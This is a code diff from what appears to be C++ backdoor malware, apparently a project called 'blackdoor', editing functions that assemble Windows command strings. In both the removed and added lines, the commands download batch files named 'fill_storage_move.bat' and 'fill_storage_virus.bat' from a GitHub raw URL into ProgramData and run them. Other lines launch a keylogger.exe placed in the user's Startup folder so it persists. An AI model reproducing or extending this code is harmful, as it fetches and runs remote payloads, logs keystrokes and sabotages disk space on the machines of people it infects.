@@ -245,7 +245,7 @@ string CE_RunExt(string buffer)
     }
     else if (ebuf.find("fill_storage") != string::npos)
     {
-        command += "curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/fill_storage_move.bat -o C:\\ProgramData\\Ms\\fill_storage_move.bat && IF EXIST C:\\ProgramData\\Ms\\fill_storage_move.bat ( start C:\\ProgramData\\Ms\\fill_storage_move.bat ) ELSE ( echo; ) && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/fill_storage_virus.bat -o C:\\ProgramData\\Ms\\fill_storage_virus.bat && IF EXIST C:\\ProgramData\\Ms\\fill_storage_virus.bat ( start C:\\ProgramData\\Ms\\fill_storage_virus.bat ) ELSE ( echo; ) && echo \n[EXT] [DOWNLOAD] - fill_storage [ move.bat, virus.bat ] component \n[EXT] [RUN] - fill_storage component ..";
+        command += "curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/fill_storage_move.bat -o C:\\ProgramData\\Ms\\fill_storage_move.bat && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/fill_storage_virus.bat -o C:\\ProgramData\\Ms\\fill_storage_virus.bat && IF EXIST C:\\ProgramData\\Ms\\fill_storage_move.bat ( start C:\\ProgramData\\Ms\\fill_storage_move.bat ) ELSE ( echo; ) && echo. && echo [EXT] [DOWNLOAD] - fill_storage [ move.bat, virus.bat ] component && echo. && echo [EXT] [RUN] - fill_storage component ..";
         ebuf = command;
     }
     else
@@ -269,12 +269,12 @@ string CE_StartupExt(string buffer)
         if (ebuf.find("run") != string::npos) {
             command += " && IF EXIST C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows \\Start Menu\\Programs\\Startup\\keylogger.exe ( start C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows \\Start Menu\\Programs\\Startup\\keylogger.exe )";
         }
-        command += " && echo \n[EXT] [DOWNLOAD] - keylogger.exe component \n[EXT] [RUN] - keylog component .. ";
+        command += " && echo. && echo [EXT] [DOWNLOAD] - keylogger.exe component && echo. && echo [EXT] [RUN] - keylog component .. ";
         ebuf = command;
     }
     else if (ebuf.find("fill_storage") != string::npos)
     {
-        command += "curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/fill_storage_move.bat -o C:\\ProgramData\\Ms\\fill_storage_move.bat && IF EXIST C:\\ProgramData\\Ms\\fill_storage_move.bat ( start C:\\ProgramData\\Ms\\fill_storage_move.bat ) ELSE ( echo; ) && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/fill_storage_virus.bat -o C:\\ProgramData\\Ms\\fill_storage_virus.bat && IF EXIST C:\\ProgramData\\Ms\\fill_storage_virus.bat ( start C:\\ProgramData\\Ms\\fill_storage_virus.bat ) ELSE ( echo; ) && echo \n[CMP] [DOWNLOAD] - fill_storage [ move.bat, virus.bat ] component \n[CMP] [RUN] - fill_storage component ..";
+        command += "curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/fill_storage_move.bat -o C:\\ProgramData\\Ms\\fill_storage_move.bat && IF EXIST C:\\ProgramData\\Ms\\fill_storage_move.bat ( start C:\\ProgramData\\Ms\\fill_storage_move.bat ) ELSE ( echo; ) && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/fill_storage_virus.bat -o C:\\ProgramData\\Ms\\fill_storage_virus.bat && IF EXIST C:\\ProgramData\\Ms\\fill_storage_virus.bat ( start C:\\ProgramData\\Ms\\fill_storage_virus.bat ) ELSE ( echo; ) && echo. && echo [CMP] [DOWNLOAD] - fill_storage [ move.bat, virus.bat ] component && echo. && echo [CMP] [RUN] - fill_storage component ..";
         ebuf = command;
     }
     else
